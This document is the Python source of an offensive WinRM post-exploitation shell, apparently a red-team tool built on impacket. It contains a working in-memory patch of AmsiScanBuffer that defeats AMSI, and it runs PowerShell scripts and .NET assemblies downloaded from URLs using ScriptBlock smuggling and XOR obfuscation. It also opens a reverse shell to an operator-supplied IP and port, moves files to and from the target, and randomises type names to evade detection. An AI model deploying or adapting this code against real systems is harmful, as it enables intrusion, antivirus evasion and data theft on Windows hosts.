import os, sys, re, logging, time, shlex
from signal import SIGINT, signal, getsignal
from pathlib import PureWindowsPath, Path
from argparse import ArgumentParser
from ipaddress import ip_address


from base64 import b64encode, b64decode
from random import randbytes, randint

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target

from Cryptodome.Hash import MD5

from winrmexec import Runspace, create_transport, argument_parser

# pip install prompt_toolkit
from prompt_toolkit import prompt, ANSI
from prompt_toolkit.history import FileHistory
prompt_toolkit_available = sys.stdout.isatty()

# -- helpers and constants: -----------------------------------------------------------------------
def chunks(xs, n): # TODO: since 3.12 python has itertools.batched
    for off in range(0, len(xs), n):
        yield xs[off:off+n]

def b64str(s):
    if isinstance(s, str):
        return b64encode(s.encode()).decode()
    else:
        return b64encode(s).decode()

def split_args(cmdline):
    try:
        args = shlex.split(cmdline, posix=False)
    except ValueError:
        return []

    fixed = []
    for arg in args:
        if arg.startswith('"') and arg.endswith('"'):
            fixed.append(arg[1:-1])
        elif arg.startswith("'") and arg.endswith("'"):
            fixed.append(arg[1:-1])
        else:
            fixed.append(arg)
    return fixed

def xorenc(xs, key):
    return bytes(x ^ key for x in xs)

class CtrlCHandler:
    def __init__(self, max_interrupts=4, timeout=5):
        self.max_interrupts = max_interrupts
        self.timeout = timeout

    def __enter__(self):
        self.interrupted = 0
        self.released = False
        self.original_handler = getsignal(SIGINT)

        def handler(signum, frame):
            self.interrupted += 1
            if self.interrupted > 1:
                n = self.max_interrupts - self.interrupted + 2
                print()
                print(f"Ctrl+C spammed, {n} more will terminate ungracefully.")
                print(f"Try waiting ~{self.timeout} more seconds for a client to get a "\
                        "chance to send the interrupt")

            if self.interrupted > self.max_interrupts:
                self.release()

        signal(SIGINT, handler)
        return self

    def __exit__(self, type, value, tb):
        self.release()

    def release(self):
        if self.released:
            return False

        signal(SIGINT, self.original_handler)
        self.released = True
        return True

# -- some types and imports for upload/download/amsi/netrun/psrun functionality: ------------------
_ns = "A" + randbytes(randint(3,8)).hex()

# a workaround for getting a streaming console output from dynamically loaded .NET assemblies:
_host_writer = "H" + randbytes(randint(3,8)).hex()
new_HostWriter = f"(New-Object {_ns}.{_host_writer} {{ Write-Host -NoNewLine $args }})"
import_HostWriter = """
Add-Type -TypeDefinition @"
namespace _NS {
public class _HOSTWRITER : System.IO.TextWriter {
  private System.Action<string> _act;
  public _HOSTWRITER(System.Action<string> act) { _act = act; }
  public override void Write(char v) { _act(v.ToString()); }
  public override void Write(string v) { _act(v); }
  public override void WriteLine(string v) { _act(v + System.Environment.NewLine); }
  public override System.Text.Encoding Encoding { get { return System.Text.Encoding.UTF8; } }
}}
"@""".replace("_NS", _ns).replace("_HOSTWRITER", _host_writer)
del _host_writer

# it is way too slow to do this in powershell for large files:
_xor_enc = "X" + randbytes(randint(3,8)).hex()
_xor_key = randint(1,255)
call_XorEnc = f"[{_ns}.{_xor_enc}]::x"
import_XorEnc = """
Add-Type @"
namespace _NS {
public class _XORENC {
  public static byte[] x(byte[] y) {
    for(int i = 0; i < y.Length; i++) { y[i] ^= _KEY; }
    return y;
  }
}}
"@
""".replace("_NS", _ns).replace("_KEY", str(_xor_key)).replace("_XORENC", _xor_enc)
del _xor_enc

# zipping files on windows will have \ as path separators and some linux tools bork:
_path_fix = "P" + randbytes(randint(3,8)).hex()
_new_PathFix = f"(New-Object {_ns}.{_path_fix})"
_importPathFix = """
Add-Type @"
namespace _NS {
public class _PATHFIX : System.Text.UTF8Encoding {
  public override byte[] GetBytes(string s) {
    s=s.Replace("\\\\", "/");
    return base.GetBytes(s);
  }
}}
"@
""".replace("_NS", _ns).replace("_PATHFIX", _path_fix)
del _path_fix

# mangle DllImports a little:
def dll_import(ns, lib, fun, sigs):
    cls  = f"f{randbytes(randint(3,8)).hex()}"
    name = f"g{randbytes(randint(3,8)).hex()}"
    ret  = sigs[0]
    args = ", ".join(f"{ty} x{randbytes(2).hex()}" for ty in sigs[1:])
    dll = "+".join(f'"{c}"' for c in lib)
    entry = "+".join(f'"{c}"' for c in fun)
    code = f'[DllImport({dll},EntryPoint={entry})] public static extern {ret} {name}({args});'
    globals()["_call_"   + fun] = f"[{_ns}.{cls}]::{name}"
    globals()["_import_" + fun] = f"""Add-Type -Name {cls} -Namespace {ns} -Member '{code}'"""

# this will add _import_LoadLibrary and _call_LoadLibrary variables in global scope:
dll_import(_ns, "kernel32", "LoadLibrary",    ["IntPtr", "string"])
dll_import(_ns, "kernel32", "GetProcAddress", ["IntPtr", "IntPtr", "string"])
dll_import(_ns, "kernel32", "VirtualProtect", ["IntPtr", "IntPtr", "IntPtr", "uint", "out uint"])
dll_import(_ns, "kernel32", "CreateProcess",  ["IntPtr", "IntPtr", "string", "IntPtr", "IntPtr", "bool", "uint", "IntPtr", "IntPtr", "Int64[]", "byte[]"])
dll_import(_ns, "ws2_32",   "WSAStartup",     ["IntPtr", "short", "byte[]"])
dll_import(_ns, "ws2_32",   "WSASocket",      ["IntPtr", "uint", "uint", "uint", "IntPtr", "uint", "uint"])
dll_import(_ns, "ws2_32",   "WSAConnect",     ["IntPtr", "IntPtr", "byte[]", "int", "IntPtr", "IntPtr", "IntPtr", "IntPtr"])
del _ns

# when splicing strings into powershell scripts use this so not to worry about escaping chars, etc:
def str_b64(arg):
    return f"([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64str(arg)}')))"

class EvilShell:
    def __init__(self, runspace):
        self.runspace  = runspace
        self.cwd        = ""
        self.stdout_log = None
        self.need_clear = False

        if prompt_toolkit_available:
            self.prompt_history = FileHistory(".winrmexec_history")

    def __del__(self):
        self.stop_log()

    def start_log(self):
        if not self.stdout_log:
            logfile = f"winrmexec_{int(time.time())}_stdout.log"
            self.write_info(f"logging output to {logfile}")
            self.stdout_log = open(logfile, "wb")

    def stop_log(self):
        if self.stdout_log:
            self.stdout_log.close()
            self.stdout_log = None

    def help(self):
        print()
        print("Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully")
        print("\x1b[1m\x1b[31mThis is not an interactive shell!\x1b[0m If you need to run programs that expect")
        print("inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell")
        print()
        print("Special !bangs:")
        print("  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'")
        print("                                   # if it contains whitespace")
        print()
        print("  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr")
        print("                                   # if you can reach your ip from the box, because this can be slow;")
        print("                                   # use -xor only in conjunction with !psrun/!netrun")
        print()
        print("  !amsi                            # amsi bypass, run this right after you get a prompt")
        print()
        print("  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is")
        print("                                   # needed unless that script tries to load a .NET assembly; if you can't reach")
        print("                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\\foo\\bar.ps1' (needs absolute path)")
        print()
        print("  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;")
        print("                                   # !amsi first if you're getting '...program with an incorrect format' errors;")
        print("                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\\foo\\bar.exe' (needs absolute path)")
        print()
        print("  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you")
        print("                                   # you need to run an executable that expects input, try:")
        print("                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' \"line1`nline2`nline3\"")
        print("                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'")
        print()
        print("  !log                             # start logging output to winrmexec_[timestamp]_stdout.log")
        print("  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log")
        print()

    def repl(self, inputs=None, debug=True):
        self.update_cwd()
        for cmd in map(str.strip, inputs or self.read_line()):
            if not cmd:
                continue
            elif cmd in { "exit", "quit", "!exit", "!quit" }:
                return
            elif cmd.startswith("!download "):
                self.download(cmd.removeprefix("!download "))
            elif cmd.startswith("!upload "):
                self.upload(cmd.removeprefix("!upload "))
            elif cmd.startswith("!amsi"):
                self.amsi_bypass()
            elif cmd.startswith("!netrun "):
               self.netrun(cmd.removeprefix("!netrun "))
            elif cmd.startswith("!psrun "):
               self.psrun(cmd.removeprefix("!psrun "))
            elif cmd.startswith("!revshell "):
                self.revshell(cmd.removeprefix("!revshell "))
            elif cmd.startswith("!log"):
                self.start_log()
            elif cmd.startswith("!stop_log"):
                self.stop_log()
            elif cmd.startswith("!") or cmd in { "help", "?" }:
                self.help()
            else:
                if self.stdout_log:
                    self.stdout_log.write(f"PS {self.cwd}> {cmd}\n".encode())
                    self.stdout_log.flush()
                self.run_with_interrupt(cmd, self.write_line)
                self.update_cwd()

    def update_cwd(self):
        self.cwd = self.run_sync("Get-Location | Select -Expand Path").strip()

    def read_line(self):
        while True:
            try:
                pre = f"\x1b[1m\x1b[33mPS\x1b[0m {self.cwd}> "
                if prompt_toolkit_available:
                    cmd = prompt(ANSI(pre), history=self.prompt_history, enable_history_search=True)
                else:
                    cmd = input(pre)
            except KeyboardInterrupt:
                continue
            except EOFError:
                return
            else:
                yield cmd

    def write_warning(self, msg):
        self.write_line({ "warn" : msg })

    def write_info(self, msg):
        self.write_line({ "info" : msg, "endl" : "\n" })

    def write_error(self, msg):
        self.write_line({ "error" : msg })

    def write_progress(self, msg):
        self.write_line({ "progress" : msg })

    def write_line(self, out):
        clear = "\033[2K\r" if self.need_clear else ""
        self.need_clear = False
        log_msg = b""

        if "stdout" in out: # from Write-Output
            print(clear + out["stdout"], flush=True)
            log_msg = out["stdout"].encode() + b"\n"

        elif "info" in out: # from Write-Host
            print(clear + out["info"], end=out["endl"], flush=True)
            log_msg = out["info"].encode() + out["endl"].encode()

        elif "error" in out: # from Write-Error and exceptions
            print(clear + "\x1b[31m" + out["error"] + "\x1b[0m", flush=True)

        elif "warn" in out: # from Write-Warning
            print(clear + "\x1b[33m" + out["warn"] + "\x1b[0m", flush=True)

        elif "verbose" in out: # from Write-Verbose
            print(clear + out["verbose"], flush=True)

        elif "progress" in out: # from Write-Progress
            print(clear + "\x1b[34m" + out["progress"] + "\x1b[0m", end="\r", flush=True)
            self.need_clear = True

        if self.stdout_log:
            self.stdout_log.write(log_msg)
            self.stdout_log.flush()

    def run_sync(self, cmd):
        return "\n".join(out.get("stdout") for out in self.runspace.run_command(cmd) if "stdout" in out)

    def run_with_interrupt(self, cmd, output_handler=None, exception_handler=None):
        output_stream = self.runspace.run_command(cmd)
        while True:
            with CtrlCHandler(timeout=5) as h:
                try:
                    out = next(output_stream)
                except StopIteration:
                    break
                except Exception as e:
                    if exception_handler and exception_handler(e):
                        continue
                    else:
                        raise e

                if output_handler:
                    output_handler(out)

                if h.interrupted:
                    self.runspace.interrupt()

        return h.interrupted > 0

    def psrun(self, cmdline):
        args = split_args(cmdline)[:2]

        url = args[-1]
        xorfunc = ""
        if args[0].lower() == "-xor":
            if len(args) != 2:
                self.write_warning("missing URL")
                return

            if args[-1].lower().startswith("http"):
                self.write_warning("use -xor only for files that were uploaded with !upload -xor")
                return

            xorfunc = call_XorEnc

        commands = [
            import_XorEnc,
            f'$c = (New-Object Net.WebClient).DownloadData({str_b64(url)})',
            f'$c = [ScriptBlock]::Create([Text.Encoding]::UTF8.GetString(({xorfunc}($c))))',
             "$c = $c.Ast.EndBlock.Copy()",
             "$a = [ScriptBlock]::Create('Get-ChildItem').Ast",
             "$b = [Management.Automation.Language.ScriptBlockAst]::new($a.Extent,$null,$null,$null,$c,$null)",
             "Invoke-Command -NoNewScope -ScriptBlock $b.GetScriptBlock()",
             "Remove-Variable @('a','b','c')"
        ]

        for cmd in commands:
            logging.debug(cmd)
            self.run_with_interrupt(cmd, self.write_line)


    def netrun(self, cmdline):
        args = split_args(cmdline)
        if args[0].lower() == "-xor":
            if len(args) == 1:
                self.write_warning("missing URL and [ARGS..]")
                return
            xorfunc = call_XorEnc
            args = args[1:]
        else:
            xorfunc = ""

        args = [ str_b64(arg) for arg in args ]

        url = args[0]
        argv = "[string[]]@(" + ",".join(args[1:]) + ")"

        commands = [
            import_HostWriter, import_XorEnc,
            f"$buf = (New-Object Net.WebClient).DownloadData({url})",
            f"$dll = [Reflection.Assembly]::Load({xorfunc}($buf))",
            f"$out = {new_HostWriter}",
            f"[Console]::SetOut($out); [Console]::SetError($out)",
            f"$dll.EntryPoint.Invoke($null,(,{argv}))",
            f"[Console]::SetOut([IO.StreamWriter]::Null)",
            f"[Console]::SetError([IO.StreamWriter]::Null)",
            f"$out.Dispose()",
            f"Remove-Variable @('buf','dll','out')"
        ]

        for cmd in commands:
            logging.debug(cmd)
            self.run_with_interrupt(cmd, self.write_line)


    def amsi_bypass(self):
        commands = [
            _import_LoadLibrary,
            _import_GetProcAddress,
            _import_VirtualProtect,
            f"$addr = {_call_GetProcAddress}({_call_LoadLibrary}({str_b64('amsi.dll')}), {str_b64('AmsiScanBuffer')})",
            f"{_call_VirtualProtect}($addr, [IntPtr]6, 64, [ref]$null)",
            f"Start-Sleep -Seconds 1", # this seems to do the trick for now...
            f"[Runtime.InteropServices.Marshal]::Copy([byte[]](0xb8,0x57,0,7,0x80,0xc3), 0, $addr, 6)",
            f"Start-Sleep -Seconds 1",
            f"{_call_VirtualProtect}($addr, [IntPtr]6, 32, [ref]$null)",
        ]
        for cmd in commands:
            logging.debug(cmd)
            self.run_with_interrupt(cmd, self.write_line)


    def revshell(self, cmdline):
        args = split_args(cmdline)
        try:
            ip, port = ip_address(args[0]).packed, int(args[1])
            p_hi, p_lo = (port >> 8) & 0xff, port & 0xff
        except:
            return

        commands = [
            _import_WSAStartup, _import_WSASocket, _import_WSAConnect, _import_CreateProcess,
            f"{_call_WSAStartup}(0x202,(New-Object byte[] 64))",
            f"$sock = {_call_WSASocket}(2,1,6,0,0,0)",
            f"{_call_WSAConnect}($sock,[byte[]](2,0,{p_hi},{p_lo},{ip[0]},{ip[1]},{ip[2]},{ip[3]},12,0,0,0,0,0,0,0,0),16,0,0,0,0)",
            f"$sinfo = [int64[]](104,0,0,0,0,0,0,0x10100000000,0,0,$sock,$sock,$sock)",
            f"{_call_CreateProcess}(0,'cmd.exe',0,0,1,0,0,0,$sinfo,(New-Object byte[] 32))",
            f"Remove-Variable @('sock','sinfo')"
        ]

        for cmd in commands:
            logging.debug(cmd)
            self.run_with_interrupt(cmd, self.write_line)


    def upload(self, cmdline):
        args = split_args(cmdline)

        if args[0].lower() == "-xor":
            unxor = False
            args = args[1:]
        else:
            unxor = True

        src = Path(args[0])
        dst = PureWindowsPath(args[1] if len(args) == 2 else src.name)
        try:
            with open(src, "rb") as f:
                buf = f.read()
        except IOError as e:
            self.write_error(str(e))
            return

        tmpfn = self.run_sync("[IO.Path]::GetTempPath()")
        tmpfn = tmpfn + randbytes(8).hex() + ".tmp"
        total = 0
        self.write_info(f"uploading to {tmpfn}")

        self.run_sync(import_XorEnc)
        for chunk in chunks(buf, 65536):
            total += len(chunk)
            chunk = f"[Convert]::FromBase64String('{b64str(xorenc(chunk, _xor_key))}')"
            xorfunc = call_XorEnc if unxor else ""
            cmd = f"Add-Content -Encoding Byte '{tmpfn}' ([byte[]]$({xorfunc}({chunk})))"

            interrupted = self.run_with_interrupt(cmd)
            if interrupted:
                self.write_warning("upload interrupted")
                self.run_sync(f"Remove-Item -Force '{tmpfn}'")
                return

            self.write_progress(f"progress: {total}/{len(buf)}")

        self.write_info(f"moving from {tmpfn} to {dst}")
        ps = f"Move-Item -Force -Path '{tmpfn}' -Destination '{dst}'"
        self.run_with_interrupt(ps, self.write_line)

        ps = f"(Get-FileHash '{dst}' -Algorithm MD5).Hash"
        out = self.run_sync(ps)
        md5sum = MD5.new(buf if unxor else xorenc(buf, _xor_key))
        if out.strip() != md5sum.hexdigest().upper():
            self.write_error("Corrupted upload")


    def download(self, cmdline):
        args = split_args(cmdline)
        if len(args) == 0 or len(args) > 2:
            self.write_warning("usage: !download RPATH [LPATH]")
            return

        src = self.run_sync(f"Resolve-Path -LiteralPath '{args[0]}' | Select -Expand Path")
        if not src:
            self.write_warning(f"{args[0]} not found")
            return

        src = PureWindowsPath(src)

        dst = Path(args[1]) if len(args) == 2 else Path(src.name)
        if dst.is_dir():
            dst = dst.joinpath(src.name)

        if not dst.parent.exists():
            os.makedirs(dst.parent, exist_ok=True)

        src_is_dir = self.run_sync(f"Test-Path -Path '{src}' -PathType Container") == "True"
        if src_is_dir:
            if not dst.name.lower().endswith(".zip"):
                dst = Path(dst.parent).joinpath(f"{dst.name}.zip")
            self.write_info(f"{src} is a directory, will download a zip file of its contents to {dst}")

            tmpdir = self.run_sync("[System.IO.Path]::GetTempPath()")
            tmpnm = randbytes(8).hex()
            tmpfn = tmpdir + tmpnm
            ps = f"""
                Add-Type -AssemblyName "System.IO.Compression.FileSystem"
                New-Item -Path '{tmpdir}' -ItemType Directory -Name '{tmpnm}' | Out-Null
                Get-ChildItem -Force -Recurse -Path '{src}' | ForEach-Object {{
                    if(-not ($_.FullName -Like "*{tmpnm}*")) {{
                        try {{
                            $dst = $_.FullName.Replace('{src}', '')
                            Copy-Item -ErrorAction SilentlyContinue -Force $_.FullName "{tmpfn}\\$dst"
                        }} catch {{
                            Write-Warning "skipping $dst"
                        }}
                    }}
                }}
                {_importPathFix}
                [IO.Compression.ZipFile]::CreateFromDirectory('{tmpfn}', '{tmpfn}.zip', [IO.Compression.CompressionLevel]::Fastest, $true, ${_new_PathFix})
                Remove-Item -Recurse -Force -Path '{tmpfn}'
            """

            self.run_with_interrupt(ps, self.write_line)
            src = tmpfn + ".zip"

        ps = f"""function Download-Remote {{
            $h = Get-FileHash '{src}' -Algorithm MD5 | Select -Expand Hash;
            $f = [System.IO.File]::OpenRead('{src}');
            $b = New-Object byte[] 65536;
            while(($n = $f.Read($b, 0, 65536)) -gt 0) {{ [Convert]::ToBase64String($b, 0, $n) }};
            $f.Close();
            [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($h));
            }}
            Download-Remote
            Remove-Item Function:Download-Remote
        """

        self.write_info(f"downloading {src}")
        def collect(buf, out):
            if part := out.get("stdout"):
                buf += b64decode(part)
                self.write_progress(f"progress: {len(buf)} bytes")

        buf = bytearray()
        self.run_with_interrupt(ps, lambda out: collect(buf, out))

        if src_is_dir:
            self.run_sync(f"Remove-Item -fo '{src}'") # remove the zip too

        if buf[-32:] != MD5.new(buf[:-32]).hexdigest().upper().encode():
            self.write_error("Corrupted download or file access error")
            return

        self.write_info(f"done, writing to {dst.resolve()}")
        try:
            with open(dst, "wb") as f:
                f.write(buf[:-32])
        except IOError as e:
            self.write_error(str(e))


def main():
    args = argument_parser().parse_args()

    logger.init(args.ts)
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)


    timeout = int(args.timeout)
    transport = create_transport(args)

    with Runspace(transport, timeout) as runspace:
        shell = EvilShell(runspace)
        try:
            if args.X:
                shell.repl(iter([args.X]))
            else:
                shell.help()
                shell.repl()
        except EOFError:
            pass

if __name__ == "__main__":
    main()

